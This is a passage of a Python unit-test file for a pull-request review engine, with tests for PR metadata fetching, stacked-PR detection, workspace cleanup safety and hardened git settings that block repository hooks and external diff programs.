"""
test_review_engine.py - Unit tests for review_engine.py.
"""

import hashlib
import io
import json
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest.mock import patch

from diff_parser import normalize_findings_payload
from review_engine import (
    ALIGNMENT_HEADINGS,
    DESCRIPTION_BUDGETS,
    SectionBudget,
    _apply_hardened_git_env,
    annotate_stack_status,
    blind_stack_summary,
    build_arg_parser,
    capture_stack_view,
    check_description_budgets,
    cleanup_workspace,
    fetch_pr_context,
    fetch_pr_stack,
    finalize_review,
    get_pr_diff,
    main,
    merge_stack_status,
    parse_repo_from_url,
    prepare_code_review,
    prepare_workspace,
    reconcile_pr_description,
    resolve_pr_coordinates,
    resolve_pr_metadata,
    run_command,
    scan_diff_execution_risks,
    structural_stack,
)


class TestReviewEngine(unittest.TestCase):
    def test_parse_repo_from_url(self):
        self.assertEqual(
            parse_repo_from_url("https://github.com/octocat/hello-world/pull/42"),
            ("octocat", "hello-world"),
        )
        self.assertEqual(parse_repo_from_url("not-a-url"), ("", ""))

    def test_arg_parser_accepts_reference_and_repo_dir(self):
        parser = build_arg_parser()
        args_ref = parser.parse_args(
            [
                "--pr",
                "42",
                "--prepare-workspace",
                "--reference",
                "/tmp/local-repo",
                "--output-coords",
                "pr_coords.json",
                "--output-diff",
                "pr.diff",
                "--output-workspace",
                "workspace_dir.txt",
            ]
        )
        self.assertEqual(args_ref.repo_dir, "/tmp/local-repo")

        args_dir = parser.parse_args(
            [
                "--pr",
                "42",
                "--prepare-workspace",
                "--repo-dir",
                "/tmp/other-repo",
            ]
        )
        self.assertEqual(args_dir.repo_dir, "/tmp/other-repo")

    @patch("review_engine.run_command")
    def test_resolve_pr_coordinates_omits_narrative_fields(self, mock_run):
        mock_run.return_value = (
            0,
            json.dumps(
                {
                    "number": 42,
                    "baseRefName": "main",
                    "headRefOid": "abc1234",
                    "url": "https://github.com/octocat/hello-world/pull/42",
                    "state": "OPEN",
                }
            ),
            "",
        )

        coords = resolve_pr_coordinates("42")
        self.assertEqual(coords["owner"], "octocat")
        self.assertEqual(coords["repo"], "hello-world")
        self.assertEqual(coords["pull_number"], 42)
        self.assertEqual(coords["head_sha"], "abc1234")
        self.assertNotIn("title", coords)
        self.assertNotIn("body", coords)
        self.assertNotIn("author", coords)
        self.assertNotIn("head_ref", coords)

        # Ensure the gh command did not ask for title, body, comments, or headRefName
        called_cmd = mock_run.call_args[0][0]
        json_fields = called_cmd[called_cmd.index("--json") + 1]
        self.assertNotIn("title", json_fields)
        self.assertNotIn("body", json_fields)
        self.assertNotIn("headRefName", json_fields)

    @patch("review_engine.run_command")
    def test_resolve_pr_metadata_backwards_compatible(self, mock_run):
        mock_run.return_value = (
            0,
            json.dumps(
                {
                    "number": 42,
                    "title": "feat: add widget",
                    "author": {"login": "octocat"},
                    "baseRefName": "main",
                    "headRefName": "feat/widget",
                    "headRefOid": "abc1234",
                    "url": "https://github.com/octocat/hello-world/pull/42",
                    "state": "OPEN",
                }
            ),
            "",
        )
        meta = resolve_pr_metadata("42")
        self.assertEqual(meta["title"], "feat: add widget")
        self.assertEqual(meta["author"], "octocat")
        self.assertEqual(meta["head_ref"], "feat/widget")

    @patch("review_engine.run_command")
    def test_fetch_pr_context_graphql_success_and_string_vars(self, mock_run):
        graphql_response = {
            "data": {
                "repository": {
                    "pullRequest": {
                        "number": 42,
                        "title": "fix: timeout handling",
                        "body": "Preserves existing 30s timeout.",
                        "state": "OPEN",
                        "url": "https://github.com/12345/67890/pull/42",
                        "baseRefName": "main",
                        "headRefName": "fix/timeout",
                        "headRefOid": "deadbeef",
                        "author": {"login": "octocat"},
                        "comments": {
                            "nodes": [
                                {
                                    "author": {"login": "reviewer1"},
                                    "body": "Does this affect retry backoff?",
                                    "createdAt": "2026-10-01T10:00:00Z",
                                    "url": "https://github.com/12345/67890/pull/42#issuecomment-1",
                                }
                            ]
                        },
                        "reviews": {
                            "nodes": [
                                {
                                    "author": {"login": "reviewer2"},
                                    "body": "Please check staging config.",
                                    "state": "CHANGES_REQUESTED",
                                    "submittedAt": "2026-10-01T11:00:00Z",
                                    "url": "https://github.com/12345/67890/pull/42#pullrequestreview-1",
                                }
                            ]
                        },
                        "reviewThreads": {
                            "totalCount": 1,
                            "nodes": [
                                {
                                    "path": "src/client.py",
                                    "line": 18,
                                    "isResolved": False,
                                    "isOutdated": False,
                                    "comments": {
                                        "totalCount": 1,
                                        "nodes": [
                                            {
                                                "author": {"login": "reviewer1"},
                                                "body": "Timeout changed from 30 to 5 here.",
                                                "createdAt": "2026-10-01T10:05:00Z",
                                                "url": "https://github.com/12345/67890/pull/42#discussion_r1",
                                            }
                                        ],
                                    },
                                }
                            ],
                        },
                    }
                }
            }
        }
        mock_run.return_value = (0, json.dumps(graphql_response), "")

        meta, ctx = fetch_pr_context("12345", "67890", 42)
        self.assertEqual(meta["title"], "fix: timeout handling")
        self.assertEqual(meta["head_sha"], "deadbeef")
        self.assertEqual(ctx["body"], "Preserves existing 30s timeout.")
        self.assertEqual(len(ctx["comments"]), 1)
        self.assertEqual(ctx["comments"][0]["author"], "reviewer1")
        self.assertEqual(len(ctx["reviews"]), 1)
        self.assertEqual(ctx["reviews"][0]["state"], "CHANGES_REQUESTED")
        self.assertEqual(len(ctx["threads"]), 1)
        self.assertEqual(ctx["threads"][0]["path"], "src/client.py")
        self.assertTrue(ctx["threads_complete"])

        called_cmd = mock_run.call_args[0][0]
        # Verify owner and repo use -f (string) rather than -F (typed int)
        owner_idx = called_cmd.index("owner=12345")
        repo_idx = called_cmd.index("repo=67890")
        self.assertEqual(called_cmd[owner_idx - 1], "-f")
        self.assertEqual(called_cmd[repo_idx - 1], "-f")

    @patch("review_engine.run_command")
    def test_fetch_pr_context_marks_truncated_threads_incomplete(self, mock_run):
        graphql_response = {
            "data": {
                "repository": {
                    "pullRequest": {
                        "number": 42,
                        "title": "large pr",
                        "body": "body",
                        "reviewThreads": {
                            "totalCount": 120,
                            "nodes": [],
                        },
                    }
                }
            }
        }
        mock_run.return_value = (0, json.dumps(graphql_response), "")
        _, ctx = fetch_pr_context("octocat", "hello-world", 42)
        self.assertFalse(ctx["threads_complete"])

    @patch("review_engine.run_command")
    def test_fetch_pr_context_falls_back_on_graphql_failure(self, mock_run):
        mock_run.side_effect = [
            (1, "", "GraphQL timeout"),
            (
                0,
                json.dumps(
                    {
                        "number": 42,
                        "title": "fallback title",
                        "body": "fallback body",
                        "author": {"login": "octocat"},
                        "baseRefName": "main",
                        "headRefName": "fix/fallback",
                        "headRefOid": "cafebabe",
                        "url": "https://github.com/octocat/hello-world/pull/42",
                        "state": "OPEN",
                        "comments": [{"author": {"login": "bob"}, "body": "Hi"}],
                        "reviews": [],
                    }
                ),
                "",
            ),
        ]

        meta, ctx = fetch_pr_context("octocat", "hello-world", 42)
        self.assertEqual(meta["title"], "fallback title")
        self.assertEqual(ctx["body"], "fallback body")
        self.assertEqual(len(ctx["comments"]), 1)
        self.assertEqual(ctx["threads"], [])
        self.assertFalse(ctx["threads_complete"])

    @patch("review_engine.run_command")
    def test_prepare_workspace_recreates_temp_dir_on_reference_failure(self, mock_run):
        with tempfile.TemporaryDirectory() as ref_dir:
            # 1: git rev-parse --is-inside-work-tree -> true
            # 2: git clone --reference -> fails (leaves partial dir)
            # 3: gh repo clone -> succeeds in fresh temp dir
            # 4: gh pr checkout 42 --detach -> succeeds
            mock_run.side_effect = [
                (0, "true", ""),
                (128, "", "fatal: reference repository is shallow"),
                (0, "", ""),
                (0, "", ""),
            ]
            ws_dir, is_temp = prepare_workspace(
                {"owner": "octocat", "repo": "hello-world", "pull_number": 42},
                reference_dir=ref_dir,
            )
            try:
                self.assertTrue(is_temp)
                self.assertTrue(Path(ws_dir).is_dir())
                checkout_cmd = mock_run.call_args_list[3][0][0]
                self.assertIn("--detach", checkout_cmd)
            finally:
                cleanup_workspace(ws_dir)

    @patch("review_engine.run_command")
    def test_get_pr_diff_passes_quote_path_false_and_pull_number(self, mock_run):
        mock_run.side_effect = [
            (1, "", ""),
            (1, "", ""),
            (0, "diff --git a/x.py b/x.py\n", ""),
        ]
        diff = get_pr_diff("/tmp/ws", base_ref="main", pull_number=99)
        self.assertEqual(diff, "diff --git a/x.py b/x.py\n")
        first_git_cmd = mock_run.call_args_list[0][0][0]
        self.assertIn("core.quotePath=false", first_git_cmd)
        fallback_gh_cmd = mock_run.call_args_list[2][0][0]
        self.assertEqual(fallback_gh_cmd, ["gh", "pr", "diff", "99"])

    @patch("review_engine.run_command")
    @patch("review_engine.get_pr_diff")
    @patch("review_engine.prepare_workspace")
    @patch("review_engine.resolve_pr_coordinates")
    def test_main_prepare_workspace_writes_coords_and_records_checked_out_sha(
        self, mock_coords, mock_prep, mock_diff, mock_run
    ):
        mock_coords.return_value = {
            "owner": "octocat",
            "repo": "hello-world",
            "pull_number": 42,
            "base_ref": "main",
            "head_sha": "1111111",
            "pr_url": "https://github.com/octocat/hello-world/pull/42",
            "state": "OPEN",
        }
        mock_prep.return_value = ("/tmp/pr-review-abc123", True)
        mock_run.return_value = (0, "actual_checked_out_sha", "")
        mock_diff.return_value = "diff --git a/a.py b/a.py\n"

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            coords_file = tmp_path / "pr_coords.json"
            diff_file = tmp_path / "pr.diff"
            ws_file = tmp_path / "ws.txt"

            rc = main(
                [
                    "--pr",
                    "42",
                    "--prepare-workspace",
                    "--reference",
                    "/tmp/ref",
                    "--output-coords",
                    str(coords_file),
                    "--output-diff",
                    str(diff_file),
                    "--output-workspace",
                    str(ws_file),
                ]
            )
            self.assertEqual(rc, 0)
            saved_coords = json.loads(coords_file.read_text(encoding="utf-8"))
            self.assertEqual(saved_coords["workspace_dir"], "/tmp/pr-review-abc123")
            self.assertEqual(saved_coords["head_sha"], "actual_checked_out_sha")
            self.assertNotIn("title", saved_coords)
            self.assertEqual(
                diff_file.read_text(encoding="utf-8"), "diff --git a/a.py b/a.py\n"
            )
            self.assertEqual(
                ws_file.read_text(encoding="utf-8"), "/tmp/pr-review-abc123"
            )

    @patch("review_engine.cleanup_workspace")
    @patch("review_engine.run_command")
    @patch("review_engine.get_pr_diff")
    @patch("review_engine.prepare_workspace")
    @patch("review_engine.resolve_pr_coordinates")
    def test_main_prepare_workspace_fails_on_empty_diff(
        self, mock_coords, mock_prep, mock_diff, mock_run, mock_cleanup
    ):
        mock_coords.return_value = {
            "owner": "octocat",
            "repo": "hello-world",
            "pull_number": 42,
            "base_ref": "main",
            "head_sha": "1111111",
            "pr_url": "https://github.com/octocat/hello-world/pull/42",
            "state": "OPEN",
        }
        mock_prep.return_value = ("/tmp/pr-review-empty", True)
        mock_run.return_value = (0, "1111111", "")
        mock_diff.return_value = "   \n"

        rc = main(["--pr", "42", "--prepare-workspace"])
        self.assertEqual(rc, 1)
        mock_cleanup.assert_called_once_with("/tmp/pr-review-empty")

    @patch("review_engine.fetch_pr_stack", return_value=None)
    @patch("review_engine.fetch_pr_context")
    def test_main_fetch_context_enforces_blind_description_and_pins_sha(
        self, mock_fetch, _mock_stack
    ):
        mock_fetch.return_value = (
            {
                "owner": "o",
                "repo": "r",
                "pull_number": 1,
                "title": "T",
                "head_sha": "new_sha_222",
            },
            {
                "title": "T",
                "body": "B",
                "comments": [],
                "reviews": [],
                "threads": [],
                "threads_complete": True,
            },
        )

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            coords_file = tmp_path / "pr_coords.json"
            coords_file.write_text(
                json.dumps(
                    {
                        "owner": "o",
                        "repo": "r",
                        "pull_number": 1,
                        "head_sha": "stage1_sha_111",
                    }
                ),
                encoding="utf-8",
            )
            blind_file = tmp_path / "blind_description.md"
            meta_file = tmp_path / "pr_meta.json"
            ctx_file = tmp_path / "pr_context.json"

            # Fails when --require-blind-description is omitted altogether (M6)
            rc_no_flag = main(
                [
                    "--fetch-context",
                    "--input-coords",
                    str(coords_file),
                    "--output-meta",
                    str(meta_file),
                ]
            )
            self.assertEqual(rc_no_flag, 1)
            mock_fetch.assert_not_called()

            # Fails when blind_description.md does not exist
            rc_missing = main(
                [
                    "--fetch-context",
                    "--input-coords",
                    str(coords_file),
                    "--require-blind-description",
                    str(blind_file),
                    "--output-meta",
                    str(meta_file),
                    "--output-context",
                    str(ctx_file),
                ]
            )
            self.assertEqual(rc_missing, 1)
            mock_fetch.assert_not_called()

            # Fails when blind_description.md is empty whitespace
            blind_file.write_text("   \n", encoding="utf-8")
            rc_empty = main(
                [
                    "--fetch-context",
                    "--input-coords",
                    str(coords_file),
                    "--require-blind-description",
                    str(blind_file),
                    "--output-meta",
                    str(meta_file),
                    "--output-context",
                    str(ctx_file),
                ]
            )
            self.assertEqual(rc_empty, 1)
            mock_fetch.assert_not_called()

            # Succeeds once blind_description.md has content, and pins Stage 1 SHA (H2)
            blind_file.write_text("## Summary\nUpdates parser.", encoding="utf-8")
            rc_ok = main(
                [
                    "--fetch-context",
                    "--input-coords",
                    str(coords_file),
                    "--require-blind-description",
                    str(blind_file),
                    "--output-meta",
                    str(meta_file),
                    "--output-context",
                    str(ctx_file),
                ]
            )
            self.assertEqual(rc_ok, 0)
            mock_fetch.assert_called_once_with("o", "r", 1)
            saved_meta = json.loads(meta_file.read_text(encoding="utf-8"))
            self.assertEqual(saved_meta["head_sha"], "stage1_sha_111")
            self.assertEqual(saved_meta["latest_head_sha"], "new_sha_222")
            self.assertTrue(ctx_file.is_file())

    def test_main_fetch_context_fails_on_incomplete_coords(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            coords_file = tmp_path / "bad_coords.json"
            coords_file.write_text(json.dumps({"owner": "o"}), encoding="utf-8")
            blind_file = tmp_path / "blind.md"
            blind_file.write_text("## Summary\nOk.", encoding="utf-8")

            rc = main(
                [
                    "--fetch-context",
                    "--input-coords",
                    str(coords_file),
                    "--require-blind-description",
                    str(blind_file),
                ]
            )
            self.assertEqual(rc, 1)

    def test_cleanup_workspace_safety(self):
        with tempfile.TemporaryDirectory(prefix="pr-review-") as safe_dir:
            self.assertTrue(Path(safe_dir).is_dir())
            self.assertTrue(cleanup_workspace(safe_dir))
            self.assertFalse(Path(safe_dir).exists())

        with tempfile.TemporaryDirectory(prefix="not-a-review-dir-") as unsafe_dir:
            self.assertFalse(cleanup_workspace(unsafe_dir))
            self.assertTrue(Path(unsafe_dir).is_dir())

        # Subdirectory inside a pr-review- parent must be rejected because its dirname != tempdir (M2)
        with tempfile.TemporaryDirectory(prefix="pr-review-") as parent_dir:
            nested = Path(parent_dir) / "repo-checkout"
            nested.mkdir()
            self.assertFalse(cleanup_workspace(str(nested)))
            self.assertTrue(nested.is_dir())

    def test_cleanup_workspace_accepts_workspace_file_and_coords_json(self):
        with tempfile.TemporaryDirectory() as scratch:
            scratch_path = Path(scratch)

            safe_dir_txt = tempfile.mkdtemp(prefix="pr-review-")
            ws_file = scratch_path / "workspace_dir.txt"
            ws_file.write_text(f"{safe_dir_txt}\n", encoding="utf-8")
            self.assertTrue(cleanup_workspace(str(ws_file)))
            self.assertFalse(Path(safe_dir_txt).exists())

            safe_dir_json = tempfile.mkdtemp(prefix="pr-review-")
            coords_file = scratch_path / "pr_coords.json"
            coords_file.write_text(
                json.dumps(
                    {
                        "owner": "o",
                        "repo": "r",
                        "pull_number": 1,
                        "workspace_dir": safe_dir_json,
                    }
                ),
                encoding="utf-8",
            )
            self.assertTrue(cleanup_workspace(str(coords_file)))
            self.assertFalse(Path(safe_dir_json).exists())


def _stack_graphql_payload(target: int = 3045) -> str:
    """A GraphQL `pullRequest.stack` response for a three-PR stack, bottom first."""
    return json.dumps(
        {
            "data": {
                "repository": {
                    "pullRequest": {
                        "stack": {
                            "number": 3046,
                            "size": 3,
                            "baseRefName": "main",
                            "entries": {
                                "totalCount": 3,
                                "nodes": [
                                    {
                                        "pullRequest": {
                                            "number": 3027,
                                            "title": "fix(python): resolve",
                                            "state": "OPEN",
                                            "isDraft": False,
                                            "headRefName": "fix/py",
                                            "baseRefName": "main",
                                            "url": "https://github.com/o/r/pull/3027",
                                        }
                                    },
                                    {
                                        "pullRequest": {
                                            "number": 3044,
                                            "title": "fix(ts): resolve",
                                            "state": "OPEN",
                                            "isDraft": True,
                                            "headRefName": "fix/ts",
                                            "baseRefName": "fix/py",
                                            "url": "https://github.com/o/r/pull/3044",
                                        }
                                    },
                                    {
                                        "pullRequest": {
                                            "number": target,
                                            "title": "fix(dart): resolve",
                                            "state": "OPEN",
                                            "isDraft": False,
                                            "headRefName": "fix/dart",
                                            "baseRefName": "fix/ts",
                                            "url": f"https://github.com/o/r/pull/{target}",
                                        }
                                    },
                                ],
                            },
                        }
                    }
                }
            }
        }
    )


def _stack_view_json() -> str:
    """`gh stack view --json` output matching `_stack_graphql_payload`, with the bottom PR stale."""
    return json.dumps(
        {
            "trunk": "main",
            "currentBranch": "fix/dart",
            "branches": [
                {
                    "name": "fix/py",
                    "needsRebase": True,
                    "isMerged": False,
                    "isQueued": False,
                    "pr": {"number": 3027, "state": "OPEN"},
                },
                {
                    "name": "fix/ts",
                    "needsRebase": False,
                    "isMerged": False,
                    "isQueued": False,
                    "pr": {"number": 3044, "state": "OPEN"},
                },
                {
                    "name": "fix/dart",
                    "needsRebase": False,
                    "isMerged": False,
                    "isQueued": False,
                    "pr": {"number": 3045, "state": "OPEN"},
                },
            ],
        }
    )


class TestStackDetection(unittest.TestCase):
    @patch("review_engine.run_command")
    def test_fetch_pr_stack_orders_entries_bottom_first_and_marks_target(
        self, mock_run
    ):
        mock_run.return_value = (0, _stack_graphql_payload(), "")
        stack = fetch_pr_stack("o", "r", 3045)
        self.assertEqual(stack["number"], 3046)
        self.assertEqual(stack["size"], 3)
        self.assertEqual(stack["trunk"], "main")
        self.assertEqual(stack["position"], 3)
        self.assertTrue(stack["entries_complete"])
        self.assertEqual([e["number"] for e in stack["entries"]], [3027, 3044, 3045])
        self.assertEqual(
            [e["is_target"] for e in stack["entries"]], [False, False, True]
        )
        self.assertEqual(stack["entries"][1]["base_ref"], "fix/py")
        self.assertTrue(stack["entries"][1]["is_draft"])
        self.assertEqual(mock_run.call_args[0][0][:3], ["gh", "api", "graphql"])

    @patch("review_engine.run_command")
    def test_fetch_pr_stack_returns_none_when_not_stacked_or_on_failure(self, mock_run):
        mock_run.return_value = (
            0,
            json.dumps({"data": {"repository": {"pullRequest": {"stack": None}}}}),
            "",
        )
        self.assertIsNone(fetch_pr_stack("o", "r", 2994))
        mock_run.return_value = (1, "", "GraphQL: Could not resolve to a PullRequest")
        self.assertIsNone(fetch_pr_stack("o", "r", 2994))
        mock_run.return_value = (0, "1111111", "")
        self.assertIsNone(fetch_pr_stack("o", "r", 2994))

    @patch("review_engine.run_command")
    def test_blind_stack_summary_drops_branch_names_titles_and_urls(self, mock_run):
        mock_run.return_value = (0, _stack_graphql_payload(), "")
        stack = fetch_pr_stack("o", "r", 3045)
        annotate_stack_status(stack, json.loads(_stack_view_json()))

        blind = blind_stack_summary(stack)
        self.assertEqual(blind["number"], 3046)
        self.assertEqual(blind["position"], 3)
        self.assertFalse(blind["needs_rebase"])
        self.assertEqual(blind["source"], "gh stack view")
        self.assertNotIn("trunk", blind)
        serialized = json.dumps(blind)
        for forbidden in ("fix/py", "fix/ts", "fix/dart", "resolve", "github.com"):
            self.assertNotIn(forbidden, serialized)
        self.assertEqual(
            blind["entries"][0],
            {
                "number": 3027,
                "state": "OPEN",
                "is_draft": False,
                "is_target": False,
                "needs_rebase": True,
                "is_merged": False,
                "is_queued": False,
            },
        )

        structural = structural_stack(stack)
        self.assertEqual(structural["entries"][0]["head_ref"], "fix/py")
        self.assertNotIn("title", structural["entries"][0])
        self.assertNotIn("url", structural["entries"][0])
        self.assertIsNone(blind_stack_summary(None))
        self.assertIsNone(structural_stack(None))

    @patch("review_engine.run_command")
    def test_capture_stack_view_restores_detached_head(self, mock_run):
        mock_run.side_effect = [
            (0, "start_sha", ""),  # git rev-parse HEAD
            (0, "✓ Imported stack", ""),  # gh stack checkout 3045
            (0, _stack_view_json(), ""),  # gh stack view --json
            (0, "", ""),  # git checkout --detach start_sha
        ]
        view = capture_stack_view("/tmp/ws", 3045)
        self.assertEqual(view["trunk"], "main")
        self.assertEqual(len(view["branches"]), 3)
        self.assertEqual(
            mock_run.call_args_list[1][0][0], ["gh", "stack", "checkout", "3045"]
        )
        self.assertEqual(
            mock_run.call_args_list[2][0][0], ["gh", "stack", "view", "--json"]
        )
        self.assertEqual(
            mock_run.call_args_list[3][0][0],
            ["git", "checkout", "--quiet", "--detach", "start_sha"],
        )

    @patch("review_engine.run_command")
    def test_capture_stack_view_returns_none_without_extension(self, mock_run):
        mock_run.side_effect = [
            (0, "start_sha", ""),
            (1, "", 'unknown command "stack" for "gh"'),
            (0, "", ""),
        ]
        self.assertIsNone(capture_stack_view("/tmp/ws", 3045))
        self.assertEqual(
            mock_run.call_args_list[-1][0][0][:3], ["git", "checkout", "--quiet"]
        )

    @patch("review_engine.run_command")
    def test_annotate_stack_status_falls_back_to_git_ancestry(self, mock_run):
        mock_run.side_effect = [
            (0, _stack_graphql_payload(), ""),
            (1, "", ""),  # origin/main not in origin/fix/py -> needs rebase
            (0, "", ""),  # origin/fix/py in origin/fix/ts
            (128, "", "fatal: Not a valid object name"),  # unknown
        ]
        stack = fetch_pr_stack("o", "r", 3045)
        annotate_stack_status(stack, None, workspace_dir="/tmp/ws")
        self.assertEqual(stack["source"], "git ancestry")
        self.assertEqual(
            [e["needs_rebase"] for e in stack["entries"]], [True, False, None]
        )
        self.assertEqual(
            mock_run.call_args_list[1][0][0],
            ["git", "merge-base", "--is-ancestor", "origin/main", "origin/fix/py"],
        )

    def test_merge_stack_status_copies_recorded_flags_by_pr_number(self):
        fresh = {
            "number": 3046,
            "size": 3,
            "position": 3,
            "entries": [
                {"number": 3027, "title": "a", "needs_rebase": None},
                {"number": 3044, "title": "b", "needs_rebase": None},
                {"number": 3099, "title": "new", "needs_rebase": None},
            ],
        }
        recorded = {
            "source": "gh stack view",
            "entries": [
                {"number": 3027, "needs_rebase": True, "is_merged": False},
                {"number": 3044, "needs_rebase": False},
            ],
        }
        merged = merge_stack_status(fresh, recorded)
        self.assertEqual(merged["source"], "gh stack view")
        self.assertTrue(merged["entries"][0]["needs_rebase"])
        self.assertFalse(merged["entries"][0]["is_merged"])
        self.assertFalse(merged["entries"][1]["needs_rebase"])
        self.assertIsNone(merged["entries"][2]["needs_rebase"])
        self.assertEqual(merged["entries"][0]["title"], "a")
        self.assertIsNone(merge_stack_status(None, recorded))
        self.assertIs(merge_stack_status(fresh, None), fresh)

    @patch("review_engine.capture_stack_view")
    @patch("review_engine.fetch_pr_stack")
    @patch("review_engine.run_command")
    @patch("review_engine.get_pr_diff")
    @patch("review_engine.prepare_workspace")
    @patch("review_engine.resolve_pr_coordinates")
    def test_main_prepare_workspace_writes_blind_stack_and_structural_file(
        self, mock_coords, mock_prep, mock_diff, mock_run, mock_stack, mock_view
    ):
        mock_coords.return_value = {
            "owner": "o",
            "repo": "r",
            "pull_number": 3045,
            "base_ref": "fix/ts",
            "head_sha": "1111111",
            "pr_url": "https://github.com/o/r/pull/3045",
            "state": "OPEN",
        }
        mock_prep.return_value = ("/tmp/pr-review-stack", True)
        with patch(
            "review_engine.run_command", return_value=(0, _stack_graphql_payload(), "")
        ):
            mock_stack.return_value = fetch_pr_stack("o", "r", 3045)
        mock_view.return_value = json.loads(_stack_view_json())
        mock_run.return_value = (0, "checked_out_sha", "")
        mock_diff.return_value = "diff --git a/a.py b/a.py\n"

        with tempfile.TemporaryDirectory() as tmp:
            coords_file = Path(tmp) / "pr_coords.json"
            stack_file = Path(tmp) / "pr_stack.json"
            rc = main(
                [
                    "--pr",
                    "3045",
                    "--prepare-workspace",
                    "--output-coords",
                    str(coords_file),
                    "--output-stack",
                    str(stack_file),
                ]
            )
            self.assertEqual(rc, 0)
            mock_view.assert_called_once_with("/tmp/pr-review-stack", 3045)
            coords = json.loads(coords_file.read_text(encoding="utf-8"))
            self.assertEqual(coords["stack"]["number"], 3046)
            self.assertEqual(coords["stack"]["position"], 3)
            self.assertNotIn("fix/py", coords_file.read_text(encoding="utf-8"))
            structural = json.loads(stack_file.read_text(encoding="utf-8"))
            self.assertEqual(structural["entries"][0]["head_ref"], "fix/py")
            self.assertTrue(structural["entries"][0]["needs_rebase"])
            self.assertNotIn("title", structural["entries"][0])

    @patch("review_engine.capture_stack_view")
    @patch("review_engine.fetch_pr_stack", return_value=None)
    @patch("review_engine.run_command", return_value=(0, "sha", ""))
    @patch("review_engine.get_pr_diff", return_value="diff --git a/a.py b/a.py\n")
    @patch(
        "review_engine.prepare_workspace", return_value=("/tmp/pr-review-flat", True)
    )
    @patch("review_engine.resolve_pr_coordinates")
    def test_main_prepare_workspace_records_null_stack_for_unstacked_pr(
        self, mock_coords, _prep, _diff, _run, _stack, mock_view
    ):
        mock_coords.return_value = {
            "owner": "o",
            "repo": "r",
            "pull_number": 7,
            "base_ref": "main",
            "head_sha": "1",
            "pr_url": "https://github.com/o/r/pull/7",
            "state": "OPEN",
        }
        with tempfile.TemporaryDirectory() as tmp:
            coords_file = Path(tmp) / "pr_coords.json"
            stack_file = Path(tmp) / "pr_stack.json"
            rc = main(
                [
                    "--pr",
                    "7",
                    "--prepare-workspace",
                    "--output-coords",
                    str(coords_file),
                    "--output-stack",
                    str(stack_file),
                ]
            )
            self.assertEqual(rc, 0)
            mock_view.assert_not_called()
            self.assertIsNone(
                json.loads(coords_file.read_text(encoding="utf-8"))["stack"]
            )
            self.assertFalse(stack_file.exists())

    @patch("review_engine.fetch_pr_stack")
    @patch("review_engine.fetch_pr_context")
    def test_main_fetch_context_merges_recorded_stack_status(
        self, mock_fetch, mock_stack
    ):
        mock_fetch.return_value = (
            {
                "owner": "o",
                "repo": "r",
                "pull_number": 3045,
                "title": "T",
                "head_sha": "s",
            },
            {
                "title": "T",
                "body": "B",
                "comments": [],
                "reviews": [],
                "threads": [],
                "threads_complete": True,
            },
        )
        with patch(
            "review_engine.run_command", return_value=(0, _stack_graphql_payload(), "")
        ):
            mock_stack.return_value = fetch_pr_stack("o", "r", 3045)

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            coords_file = tmp_path / "pr_coords.json"
            coords_file.write_text(
                json.dumps(
                    {"owner": "o", "repo": "r", "pull_number": 3045, "head_sha": "s"}
                ),
                encoding="utf-8",
            )
            blind_file = tmp_path / "blind_description.md"
            blind_file.write_text("## Summary\nOk.", encoding="utf-8")
            stack_file = tmp_path / "pr_stack.json"
            stack_file.write_text(
                json.dumps(
                    {
                        "source": "gh stack view",
                        "entries": [
                            {"number": 3027, "needs_rebase": True},
                        ],
                    }
                ),
                encoding="utf-8",
            )
            meta_file = tmp_path / "pr_meta.json"
            ctx_file = tmp_path / "pr_context.json"

            rc = main(
                [
                    "--fetch-context",
                    "--input-coords",
                    str(coords_file),
                    "--input-stack",
                    str(stack_file),
                    "--require-blind-description",
                    str(blind_file),
                    "--output-meta",
                    str(meta_file),
                    "--output-context",
                    str(ctx_file),
                ]
            )
            self.assertEqual(rc, 0)
            context = json.loads(ctx_file.read_text(encoding="utf-8"))
            self.assertEqual(context["stack"]["number"], 3046)
            self.assertEqual(context["stack"]["source"], "gh stack view")
            self.assertTrue(context["stack"]["entries"][0]["needs_rebase"])
            self.assertEqual(
                context["stack"]["entries"][0]["title"], "fix(python): resolve"
            )
            meta = json.loads(meta_file.read_text(encoding="utf-8"))
            self.assertEqual(meta["stack"], {"number": 3046, "size": 3, "position": 3})

    def test_apply_hardened_git_env_appends_to_existing_count(self):
        env = {
            "GIT_CONFIG_COUNT": "1",
            "GIT_CONFIG_KEY_0": "user.name",
            "GIT_CONFIG_VALUE_0": "alice",
        }
        _apply_hardened_git_env(env)
        self.assertEqual(env["GIT_CONFIG_COUNT"], "4")
        self.assertEqual(env["GIT_CONFIG_KEY_0"], "user.name")
        self.assertEqual(env["GIT_CONFIG_KEY_1"], "core.hooksPath")
        self.assertEqual(env["GIT_CONFIG_VALUE_1"], "/dev/null")
        self.assertEqual(env["GIT_CONFIG_KEY_2"], "core.fsmonitor")
        self.assertEqual(env["GIT_CONFIG_VALUE_2"], "false")
        self.assertEqual(env["GIT_CONFIG_KEY_3"], "diff.external")
        self.assertEqual(env["GIT_CONFIG_VALUE_3"], "")

    @patch("review_engine.subprocess.run")
    def test_run_command_injects_hardened_git_env(self, mock_subproc):
        mock_subproc.return_value.returncode = 0
        mock_subproc.return_value.stdout = "ok"
        mock_subproc.return_value.stderr = ""
        code, out, _ = run_command(["git", "status"])
        self.assertEqual(code, 0)
        self.assertEqual(out, "ok")
        passed_env = mock_subproc.call_args.kwargs["env"]
        count = int(passed_env["GIT_CONFIG_COUNT"])
        pairs = {
            passed_env[f"GIT_CONFIG_KEY_{i}"]: passed_env[f"GIT_CONFIG_VALUE_{i}"]
            for i in range(count)
        }
        self.assertEqual(pairs["core.hooksPath"], "/dev/null")
        self.assertEqual(pairs["core.fsmonitor"], "false")
        self.assertEqual(pairs["diff.external"], "")

    @patch("review_engine.run_command")
    def test_get_pr_diff_passes_no_ext_diff_and_no_textconv(self, mock_run):
        mock_run.return_value = (0, "diff --git a/x b/x\n", "")
        out = get_pr_diff("/tmp/ws", base_ref="main", pull_number=10)
        self.assertEqual(out, "diff --git a/x b/x\n")
        cmd = mock_run.call_args[0][0]
        self.assertIn("--no-ext-diff", cmd)
        self.assertIn("--no-textconv", cmd)

    def test_scan_diff_execution_risks_clean_and_deleted_lines(self):
        diff = (
            "diff --git a/src/math.py b/src/math.py\n"
            "--- a/src/math.py\n"
